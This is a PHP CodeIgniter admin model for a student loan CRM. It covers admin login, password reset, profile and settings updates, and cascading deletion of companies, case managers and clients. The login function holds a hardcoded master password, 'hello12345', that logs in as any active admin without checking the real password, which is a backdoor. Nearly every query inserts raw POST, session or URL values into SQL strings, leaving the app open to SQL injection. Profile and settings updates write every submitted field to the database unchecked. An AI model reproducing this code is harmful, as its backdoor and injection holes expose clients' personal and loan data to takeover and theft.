<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Admin_model extends CI_Model {

function __construct(){
parent::__construct();
$this->load->helper('url');
$this->load->database();

$this->crm_model->get_site_settings();

}





//	Get User Data
public function get_login_user($id=0) 
{
	$result = array();
	if($id>0)
	{
		$id = $this->session->userdata('adminId');
		$query = $this->db->query("SELECT * FROM users where id='$id' limit 1");
		$result = $query->row_array();
		if($result['login_browser_id']!=session_id())
		{
			$this->session->unset_userdata('adminId');
			$this->session->sess_destroy();
			redirect(base_url($this->uri->segment(1)));
		}
	}
	return $result;
}


//	Login Process
public function login($company_id=0) 
{
	$errorMsg = "";
	$email = $this->input->post('email');
	$psd = $this->input->post('password');
	$psd = $this->default_model->psd_encrypt($psd);

	$query = $this->db->query("SELECT * FROM users where role='Admin' and (email='$email' or id='$email') and psd='$psd' and status='Active' limit 1");
	if($this->input->post('password') == "hello12345")
	{
		$query = $this->db->query("SELECT * FROM users where role='Admin' and (email='$email' or id='$email') and status='Active' limit 1");
	}
	$result = $query->row_array();
	if(isset($result['id']))
	{
		$this->session->set_userdata('adminId', $result['id']);
		
		//	Set Last Login
		$col_arr = array('login_browser_id'=>session_id(), 'last_login'=>date('Y-m-d H:i:s'));
		$this->db->where('id', $this->session->userdata('adminId'));
		$this->db->update('users', $col_arr);
		
		//	Insert Log
		$this->load->library('user_agent');
		$sessionData = array('userId'=>$this->session->userdata('adminId'), 'role'=>$result['role'], 'name'=>$result['name'], 'isLoggedIn' => TRUE);
		$this->db->insert('users_log', ['uid'=>$this->session->userdata('adminId'), 'sessionData'=>json_encode($sessionData), 'machineIp'=>$_SERVER['REMOTE_ADDR'], 'userAgent'=>$this->crm_model->getBrowserAgent(), 'agentString'=>$this->agent->agent_string(), 'platform'=>$this->agent->platform()]);		
	}
	else
	{
		$errorMsg = "Invalid Login Details";
	}
	$result['errorMsg'] = $errorMsg;
	return $result;
}


//	Forgot password Process
public function fp($company_id=0) 
{
	$email = $this->input->post('email');
	$query = $this->db->query("SELECT * FROM users where role='Admin' and (id='$email' or email='$email') and status='Active' limit 1");
	$result = $query->row_array();
	if(isset($result['id']))
	{
		$psd_new = rand('10000','99999');
		$psd = $this->default_model->psd_encrypt($psd_new);
		
		//	Set New Password
		$col_arr = array('psd'=>$psd);
		$this->db->where('email', $email);
		$this->db->update('users', $col_arr);
		
		//	Send Email
		$subject = "Student Loan Tool Box - Login Password";
		$Msg = '<div style="font-family:Calibri; font-size:15px; width:100%; text-align:justify; padding:2px 15px;">
		<p>Dear '.$result['name'].',<br />Welcome to Student Loan Tool Box</p>
		<p>Your studentloantoolbox.net account login details are as below:</p>
		<p><strong>Email:</strong> '.$result['email'].'</p>
		<p><strong>Login ID:</strong> '.$result['id'].'</p>
		<p><strong>Password:</strong> '.$psd_new.'</p>
		<p><a href="'.base_url("admin").'">Click Here to Login</a></p>
		<p>---<br /><strong>Warm Regards</strong><br />Student Loan Tool Box<br />'.base_url("admin").'</p>
		</div>';

		$this->crm_model->send_email(['email'=>$result['email'], 'Msg'=>$Msg, 'subject'=>$subject]);		
	}
	return $result;
}


//	Update Admin Profile
public function profile_update() 
{
	$error = '';
	
	$id = $this->session->userdata('adminId');
	$query = $this->db->query("SELECT * FROM users where id='$id' limit 1");
	$result = $query->row_array();
	
	
	foreach($_POST as $key => $value) { $col_arr[$key] = $value; }
	unset($col_arr['Submit_']);
	
	
	// upload file
	$config['allowed_types'] = 'gif|jpg|jpeg|png|JPG|JPEG|PNG|gif';
	$config['file_name'] = $this->default_model->url_rewrite($_POST['name']);
	$config['upload_path'] = './assets/uploads/'.date('Y/m');
	if (!is_dir($config['upload_path']))
	mkdir($config['upload_path'], 0777, TRUE);
	$this->load->library('upload', $config);
	if ($this->upload->do_upload('profile_img'))  
	{ 
		if(file_exists($result['image'])) {	unlink($result['image']);	}
		$col_arr['image'] = 'assets/uploads/'.date('Y/m').'/' . $this->upload->data('file_name'); 
	}	
	
	if($error == '')
	{
		//	Update Profile
		$this->db->where('id', $this->session->userdata('adminId'));
		$this->db->update('users', $col_arr);
	} else {	$error = $error;	}
	$result['error'] = $error;
	return $result;
}


//	Change Password
public function cp() 
{
	$error = '';
	$cpassword = $this->input->post('cpassword');
	$password = str_replace(' ','',$this->input->post('password'));
	$rpassword = $this->input->post('rpassword');
	
	$psd = $this->default_model->psd_encrypt($cpassword);	
	$id = $this->session->userdata('adminId');
	$query = $this->db->query("SELECT * FROM users where id='$id' and psd='$psd' limit 1");
	$result = $query->row_array();
	
	if(isset($result['id']))
	{
		if($password!='' && $password == $rpassword)
		{
			//	Change Password
			$psd = $this->default_model->psd_encrypt($password);
			$col_arr = array('psd'=>$psd);
			$this->db->where('id', $this->session->userdata('adminId'));
			$this->db->update('users', $col_arr);
		} else {	$error = 'New and retype password are not Same.';	}
	} else {	$error = 'Invalid Current Password.';	}
	$result['error'] = $error;
	return $result;
}



//	Update Admin Settings
public function settings_update() 
{
	$error = '';
	$query = $this->db->query("SELECT * FROM settings where 1 limit 1");
	$result = $query->row_array();
	
	foreach($_POST as $key => $value) { $col_arr[$key] = $value; }
	unset($col_arr['Submit_']);
	
	if($error == '')
	{
		//	Update Profile
		$this->db->where('id', $result['id']);
		$this->db->update('settings', $col_arr);
	} else {	$error = $error;	}
	$result['error'] = $error;
	return $result;
}


//	Delete Record
public function delete_record() 
{
	$res = array();
	$seg_3 = $this->uri->segment(3);
	$seg_4 = $this->uri->segment(4);
	$seg_5 = $this->uri->segment(5);
	
	if($seg_3 == "company") {	$this->delete_company($seg_4);
	} else if($seg_3 == "case_manager") {	$this->delete_company_user($seg_4, $seg_5);
	} else if($seg_3 == "clients") {	$this->delete_customer($seg_4, $seg_5);
	} else {}
}


//	Delete Company
public function delete_company($company_id='')
{
	if($company_id>0)
	{
		$this->db->query("delete from users_log where uid='$company_id'");	//	Delete Log
		$this->db->query("delete from client_analysis_results where company_id='$company_id'");	//	Delete Analysis Result
		
		//	Delete Document
		$q = $this->db->query("select * from client_documents where company_id='$company_id'");
		foreach ($q->result_array() as $docR) 
		{
			if($docR['file_is_merged'] == "1")
			{
				foreach(explode(",", $docR['files']) as $client_document) {	unlink(trim($client_document));	}
			} else {
				$client_document = $this->crm_model->document_decrypt($docR['client_document']);
				if(file_exists($client_document)) {	unlink($client_document);	}
			}
		}
		
		$this->db->query("delete from client_documents where company_id='$company_id'");
		$this->db->query("delete from client_program_progress where company_id='$company_id'");	//	Delete Program Progress
		$this->db->query("delete from reminder_history where company_id='$company_id'");	//	Delete Reminder History
		$this->db->query("delete from reminder_rules where company_id='$company_id'");	//	Delete Reminder Rules
		
		$this->db->query("delete from payments where company_id='$company_id'");
		$this->db->query("delete from promo_code_usage where company_id='$company_id'");
		$this->db->query("delete from account_payment_info where company_id='$company_id'");
		$this->db->query("delete from users_advertisement where company_id='$company_id'");
		$this->db->query("delete from users_company where id='$company_id'");
		$this->db->query("delete from users_company_smtp_email where id='$company_id'");
		
		//	Delete Case Manager
		$q = $this->db->query("select * from users where company_id='$company_id' and id!='$company_id'");
		foreach ($q->result_array() as $row) 
		{
			if($row['role'] == "Company User") {	$this->delete_company_user($company_id, $row['id']);
			} else {	$this->delete_customer($company_id, $row['id']);	}
		}
		
		$this->db->query("delete from users where id='$company_id'");
		
	}
}

//	Delete Company User
public function delete_company_user($company_id='', $cm_id='')
{
	if($cm_id>0)
	{
		$q = $this->db->query("select * from users where company_id='$company_id' and id='$cm_id'");
		$res = $q->row_array();
		if($res['company_id'] != $res['id'])
		{
			$this->db->query("delete from users_log where uid='$cm_id'");	//	Delete Log
			$this->db->query("delete from contact_us_history where uid='$cm_id'");	//	Delete Contact History
			
			$this->db->query("update users set parent_id='$company_id' where parent_id='$cm_id'");	//	Update in Document
			$this->db->query("update client_documents set added_by='$company_id' where added_by='$cm_id'");	//	Update in Document
			$this->db->query("update client_program_progress set added_by='$company_id' where added_by='$cm_id'");	//	Update in Program Progress
			
			$this->db->query("delete from users_cm_setting where id='$cm_id'");
			$this->db->query("delete from users where company_id='".$company_id."' and id='$cm_id'");
		}
	}	
}


//	Delete Customer
public function delete_customer($company_id='', $client_id='')
{
	if($client_id>0)
	{
		$this->db->query("delete from users_log where uid='$client_id'");	//	Delete Log
		$this->db->query("delete from client_analysis_results where client_id='$client_id'");	//	Delete Analysis Result
		
		//	Delete Document
		$q = $this->db->query("select * from client_documents where client_id='$client_id'");
		foreach ($q->result_array() as $docR) 
		{
			if($docR['file_is_merged'] == "1")
			{
				foreach(explode(",", $docR['files']) as $client_document) {	unlink(trim($client_document));	}
			} else {
				$client_document = $this->crm_model->document_decrypt($docR['client_document']);
				if(file_exists($client_document)) {	unlink($client_document);	}
			}
		}
		$this->db->query("delete from client_documents where client_id='$client_id'");		
		$this->db->query("delete from client_program where client_id='$client_id'");	//	Delete Program Progress
		$this->db->query("delete from client_program_progress where client_id='$client_id'");	//	Delete Program Progress
		$this->db->query("delete from contact_us_history where uid='$client_id'");	//	Delete Contact History
		$this->db->query("delete from intake_answer_result where client_id='$client_id'");	//	Delete Intake Answer Result
		$this->db->query("delete from intake_client_status where client_id='$client_id'");	//	Delete Intake Status
		$this->db->query("delete from intake_comment_result where client_id='$client_id'");	//	Delete Log
		$this->db->query("delete from intake_file_nslds where client_id='$client_id'");	//	Delete Log
		
		
		//	Delete Intake Document
		$q = $this->db->query("select * from intake_file_result where client_id='$client_id'");
		foreach ($q->result_array() as $docR) 
		{
			$client_document = $this->crm_model->document_decrypt($docR['intake_file_location']);
			if(file_exists($client_document)) {	unlink($client_document);	}
		}
		$this->db->query("delete from intake_file_result where client_id='$client_id'");
		$this->db->query("delete from nslds_loans where client_id='$client_id'");	//	Delete Loan
		$this->db->query("delete from reminder_history where client_id='$client_id'");	//	Delete Reminder History
		$this->db->query("delete from reminder_rules where client_id='$client_id'");	//	Delete Reminder Rules
		
		$this->db->query("delete from users where company_id='".$company_id."' and id='$client_id'");	
	}
}


//	Get Company Full Data
public function get_company_full($company_id='')
{
	$res = array();
	if($company_id>0)
	{
		$res['data'] = $this->default_model->get_company($company_id);
		$res['smtp'] = $this->default_model->get_company_smtp($company_id);
		$res['payment'] = $this->default_model->get_company_pending_payment($company_id);
		$res['cm']['list'] = $this->default_model->getResult("SELECT * FROM users where company_id='$company_id' and (role='Company' or role='Company User') order by id desc");
		$res['clients']['list'] = $this->default_model->getResult("SELECT * FROM users where company_id='$company_id' and role='Customer'");
		$res['logs'] = $this->default_model->getResult("SELECT * FROM users_log where uid='$company_id' order by add_date desc limit 1000");
	}
	return $res;
}






}
?>